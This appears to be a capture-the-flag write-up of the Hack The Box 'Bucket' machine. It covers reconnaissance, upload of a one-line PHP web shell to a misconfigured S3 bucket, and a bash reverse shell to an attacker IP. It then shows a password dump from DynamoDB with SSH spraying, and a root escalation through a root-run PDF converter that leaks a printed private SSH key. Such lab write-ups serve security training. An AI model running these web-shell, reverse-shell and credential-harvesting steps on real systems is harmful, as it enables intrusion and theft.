
# HTB:Bucket

## nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.41
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://bucket.htb/
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Uptime guess: 35.404 days (since Thu Feb 27 20:09:26 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8888/tcp)
HOP RTT      ADDRESS
1   64.72 ms 10.10.16.1

```
- change hosts
- web page code
```html
<article>
<div class="coffee">
<img src="http://s3.bucket.htb/adserver/images/bug.jpg" alt="Bug" height="160" width="160">
</div>
<div class="description">
<h3>Bug Bounty and 0day Research</h3>
<span>march 17, 2020 | Security</span>
<p>Customised bug bounty and new 0day feeds. Feeds can be used on TV, mobile, desktop and web applications. Collecting security feeds from 100+ different trusted sources around the world.</p>
</div>
</article>
<div class="articles">

```
- it is a s3 aws cloud box

## FUZZ

```bash
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ wfuzz -c -u http://10.10.10.212 -H "Host: FUZZ.bucket.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hw 26
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.212/
Total requests: 19966

=====================================================================
ID           Response   Lines    Word       Chars       Payload          
=====================================================================

000000247:   404        0 L      2 W        21 Ch       "s3"             
000009532:   400        12 L     53 W       422 Ch      "#www"           
000010581:   400        12 L     53 W       422 Ch      "#mail"          

Total time: 120.8522
Processed Requests: 19966
Filtered Requests: 19963
Requests/sec.: 165.2099


```

## Dir gobuster

```bash
┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://s3.bucket.htb
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://s3.bucket.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/health               (Status: 200) [Size: 54]
/shell                (Status: 200) [Size: 0]
/shellcode            (Status: 500) [Size: 158]
/shells               (Status: 500) [Size: 158]
/shellscripts         (Status: 500) [Size: 158]
Progress: 15115 / 220561 (6.85%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 15115 / 220561 (6.85%)
[ERROR] context canceled
===============================================================
Finished
===============================================================

```

## aws enum
```bash
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ aws configure
AWS Access Key ID [****************cket]: bucket
AWS Secret Access Key [****************cket]: bucket
Default region name [bucket]: bucket
Default output format [None]: 
                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ aws s3 --endpoint-url http://s3.bucket.htb ls               
2025-04-04 07:03:02 adserver
                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver 
                           PRE images/
2025-04-04 07:05:04       5344 index.html
                                                                                                                                                            
┌──(kali㉿kali)-[~/Desktop/HTB]
└─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver/images/
2025-04-04 07:05:04      37840 bug.jpg
2025-04-04 07:05:04      51485 cloud.png
2025-04-04 07:05:04      16486 malware.png


```

## aws cp upload shell
```bash
──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ cat shell.php                  
<?php system($_REQUEST["cmd"]); ?>
                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver
                           PRE images/
2025-04-04 07:09:04       5344 index.html
                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ aws s3 --endpoint-url http://s3.bucket.htb cp ./shell.php s3://adserver
upload: ./shell.php to s3://adserver/shell.php                    
                                                                                  
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ aws s3 --endpoint-url http://s3.bucket.htb ls s3://adserver            
                           PRE images/
2025-04-04 07:09:04       5344 index.html
2025-04-04 07:10:22         35 shell.php

```

## reverse shell
```bash
curl http://bucket.htb/shell.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.14/1234 0>&1'"
```
```bash
www-data@bucket:/var/www/html$ python3 -c 'import pty;pty.spawn("bash")'
python3 -c 'import pty;pty.spawn("bash")'
www-data@bucket:/var/www/html$ lcd ..
lcd ..

Command 'lcd' not found, but there are 16 similar ones.

www-data@bucket:/var/www/html$ cd ..
cd ..
www-data@bucket:/var/www$ ls
ls
bucket-app  html
www-data@bucket:/var/www$ ls -al
ls -al
total 16
drwxr-xr-x   4 root root 4096 Feb 10  2021 .
drwxr-xr-x  14 root root 4096 Feb 10  2021 ..
drwxr-x---+  4 root root 4096 Feb 10  2021 bucket-app
drwxr-xr-x   2 root root 4096 Apr  4 11:17 html
www-data@bucket:/var/www$ getfacl bucket-app/
getfacl bucket-app/
# file: bucket-app/
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
www-data@bucket:/home$ cd ./roy
cd ./roy
www-data@bucket:/home/roy$ ls -al
ls -al
total 28
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 .
drwxr-xr-x 3 root root 4096 Sep 16  2020 ..
lrwxrwxrwx 1 roy  roy     9 Sep 16  2020 .bash_history -> /dev/null
-rw-r--r-- 1 roy  roy   220 Sep 16  2020 .bash_logout
-rw-r--r-- 1 roy  roy  3771 Sep 16  2020 .bashrc
-rw-r--r-- 1 roy  roy   807 Sep 16  2020 .profile
drwxr-xr-x 3 roy  roy  4096 Sep 24  2020 project
-r-------- 1 roy  roy    33 Apr  4 10:38 user.txt
www-data@bucket:/home/roy$ cat user.txt
cat user.txt
cat: user.txt: Permission denied

```

## try to get credential, with www-data we can do nothing
```bash
www-data@bucket:/home/roy$ aws --endpoint-url http://127.0.0.1:4566 dynamodb list-tables
<oint-url http://127.0.0.1:4566 dynamodb list-tables
You must specify a region. You can also configure your region by running "aws configure".
www-data@bucket:/home/roy$ aws configure
aws configure
AWS Access Key ID [None]: bucket
bucket
AWS Secret Access Key [None]: bucket
bucket
Default region name [None]: bucket
bucket
Default output format [None]: 


[Errno 13] Permission denied: '/var/www/.aws'
www-data@bucket:/home/roy$ 


````

## however i try to get tables from DB in my kali it works
- there are some passwords, try to login using ssh username:roy
```bash
┌──(kali㉿kali)-[~]
└─$ aws --endpoint-url http://s3.bucket.htb dynamodb list-tables
{
    "TableNames": [
        "users"
    ]
}
      
└─$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users                                         
{
    "Items": [
        {
            "password": {
                "S": "Management@#1@#"
            },
            "username": {
                "S": "Mgmt"
            }
        },
        {
            "password": {
                "S": "Welcome123!"
            },
            "username": {
                "S": "Cloudadm"
            }
        },
        {
            "password": {
                "S": "n2vM-<_K_Q:.Aa2"
            },
            "username": {
                "S": "Sysadm"
            }
        }
    ],
    "Count": 3,
    "ScannedCount": 3,
    "ConsumedCapacity": null
}
┌──(kali㉿kali)-[~]
└─$ aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name users | jq -r '.Items[].password.S' > passwords
                                                                          
┌──(kali㉿kali)-[~]
└─$ crackmapexec ssh 10.10.10.212 -u roy -p passwords
/usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence '\ '
  formatter_class=RawTextHelpFormatter)
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SAM C:\\windows\\temp\\SAM && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence '\S'
  self.conn.execute_cmd("reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY && reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM")
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence '\p'
  stringbinding = 'ncacn_np:%s[\pipe\svcctl]' % self.__host
/usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence '\{'
  command = self.__shell + 'echo '+ data + ' ^> \\\\127.0.0.1\\{}\\{} 2^>^&1 > %TEMP%\{} & %COMSPEC% /Q /c %TEMP%\{} & %COMSPEC% /Q /c del %TEMP%\{}'.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
SSH         10.10.10.212    22     10.10.10.212     [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4
SSH         10.10.10.212    22     10.10.10.212     [-] roy:Management@#1@# Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [-] roy:Welcome123! Authentication failed.
SSH         10.10.10.212    22     10.10.10.212     [+] roy:n2vM-<_K_Q:.Aa2 


```

## initial access! 
```bash

roy@bucket:~$ ls
project  user.txt
roy@bucket:~$ cat user.txt 
1f13505b85e45b0646e46a9e458037dd
roy@bucket:~$ ls -al project/
total 44
drwxr-xr-x  3 roy roy  4096 Sep 24  2020 .
drwxr-xr-x  4 roy roy  4096 Apr  4 11:24 ..
-rw-rw-r--  1 roy roy    63 Sep 24  2020 composer.json
-rw-rw-r--  1 roy roy 20533 Sep 24  2020 composer.lock
-rw-r--r--  1 roy roy   367 Sep 24  2020 db.php
drwxrwxr-x 10 roy roy  4096 Sep 24  2020 vendor
roy@bucket:~$ 


```

## PE enums
it define bucket-app site listening on 8000 only on localhost AssignUserId root root means that the application on 8000 is also runing as root!

```bash

roy@bucket:~$ netstat -pantu
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:34353         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 10.10.10.212:60442      10.10.16.14:1234        CLOSE_WAIT  -                   
tcp        0      0 172.18.0.1:37842        172.18.0.2:4566         TIME_WAIT   -                   
tcp        0      0 127.0.0.1:36254         127.0.0.1:4566          TIME_WAIT   -                   
tcp        0      1 10.10.10.212:34166      1.0.0.1:53              SYN_SENT    -                   
tcp        0      0 127.0.0.1:4566          127.0.0.1:36248         TIME_WAIT   -                   
tcp        0    360 10.10.10.212:22         10.10.16.14:40290       ESTABLISHED -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 10.10.10.212:80         10.10.16.14:52714       ESTABLISHED -                   
udp        0      0 127.0.0.1:48364         127.0.0.53:53           ESTABLISHED -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*    

roy@bucket:~$ cd /etc/apache2/sites-enabled/
roy@bucket:/etc/apache2/sites-enabled$ ls
000-default.conf
roy@bucket:/etc/apache2/sites-enabled$ cat 000-default.conf 
<VirtualHost 127.0.0.1:8000>
        <IfModule mpm_itk_module>
                AssignUserId root root
        </IfModule>
        DocumentRoot /var/www/bucket-app
</VirtualHost>

<VirtualHost *:80>
        DocumentRoot /var/www/html
        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^bucket.htb$
        RewriteRule /.* http://bucket.htb/ [R]
</VirtualHost>
<VirtualHost *:80>
        # The ServerName directive sets the request scheme, hostname and port that
        # the server uses to identify itself. This is used when creating
        # redirection URLs. In the context of virtual hosts, the ServerName
        # specifies what hostname must appear in the request's Host: header to
        # match this virtual host. For the default virtual host (this file) this
        # value is not decisive as it is used as a last resort host regardless.
        # However, you must set it for any further virtual host explicitly.
        #ServerName www.example.com
        ProxyPreserveHost on
        ProxyPass / http://localhost:4566/
        ProxyPassReverse / http://localhost:4566/
        <Proxy *>
                 Order deny,allow
                 Allow from all
         </Proxy>
        ServerAdmin webmaster@localhost
        ServerName s3.bucket.htb
        # Available loglevels: trace8, ..., trace1, debug, info, notice, warn,
        # error, crit, alert, emerg.
        # It is also possible to configure the loglevel for particular
        # modules, e.g.
        #LogLevel info ssl:warn

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

        # For most configuration files from conf-available/, which are
        # enabled or disabled at a global level, it is possible to
        # include a line for only one particular virtual host. For example the
        # following line enables the CGI configuration for this host only
        # after it has been globally disabled with "a2disconf".
        #Include conf-available/serve-cgi-bin.conf
</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet


```

## search the vuln in bucket-app/

```bash
roy@bucket:/var/www/bucket-app$ cat index.php 
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>


```
- On a POST request, para set "get_alerts" and query the DynamoDbClient for alerts that contain "Ransomware"
- it calls the pd4ml jar on that temporary HTML file to convert it to PDF
- crack table and title and item to triger it

## Payload
- in kali

```bash
aws --endpoint-url http://s3.bucket.htb dynamodb create-table --table-name alerts --attribute-definitions AttributeName=title,AttributeType=S AttributeName=data,AttributeType=S --key-schema AttributeName=title,KeyType=HASH AttributeName=data,KeyType=RANGE --provisioned-throughput ReadCapacityUnits=10,WriteCapacityUnits=5

aws --endpoint-url http://s3.bucket.htb dynamodb put-item --table-name alerts --item file://item.json

aws --endpoint-url http://s3.bucket.htb dynamodb scan --table-name alerts


```

- in roy ssh
```bash
curl -s http://127.0.0.1:8000/index.php --data 'action=get_alerts'
```

- in kali
```bash
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ sudo sshpass -p 'n2vM-<_K_Q:.Aa2' scp roy@10.10.10.212:/var/www/bucket-app/files/result.pdf .
```

```plaintext
-----BEGIN OPENSSH PRIVATE KEY-----
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 
-----END OPENSSH PRIVATE KEY-----
```

## SSH PWNED!

```bash
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ vim root_rsa_priv
                                                                              
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ ls -al
total 32
drwxrwxr-x 2 kali kali 4096 Apr  4 07:59 .
drwxrwxr-x 3 kali kali 4096 Apr  4 07:51 ..
-rw-rw-r-- 1 kali kali  135 Apr  4 07:41 item.json
-rw-rw-r-- 1 kali kali   19 Apr  4 06:51 readme.md
-rw-r--r-- 1 root root 3869 Apr  4 07:57 result.pdf
-rw-rw-r-- 1 kali kali 2603 Apr  4 07:59 root_rsa_priv
-rw-rw-r-- 1 kali kali   35 Apr  4 07:09 shell.php
-rw-rw-r-- 1 kali kali   10 Apr  4 07:06 test.txt
                                                                              
┌──(kali㉿kali)-[~/Desktop/HTB/bucket]
└─$ sudo ssh root@10.10.10.212 -i ./root_rsa_priv 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 04 Apr 2025 12:00:23 PM UTC

  System load:                      0.0
  Usage of /:                       33.6% of 17.59GB
  Memory usage:                     20%
  Swap usage:                       0%
  Processes:                        249
  Users logged in:                  1
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212

 * Kubernetes 1.19 is out! Get it in one command with:

     sudo snap install microk8s --channel=1.19 --classic

   https://microk8s.io/ has docs and details.

229 updates can be installed immediately.
103 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Feb  9 14:39:03 2021
root@bucket:~# ls
backups             files        restore.sh  snap      sync.sh
docker-compose.yml  restore.php  root.txt    start.sh
root@bucket:~# cat root.txt
4bc0698ff5dd8954884d2578954d567d

```

## what i got 
- s3-aws
- dynamodb	"running"
- user roy:n2vM-<_K_Q:.Aa2
- ports: 22, 80, 8000, 4566

## loot

- user.txt : `1f13505b85e45b0646e46a9e458037dd`
- root.txt : `4bc0698ff5dd8954884d2578954d567d`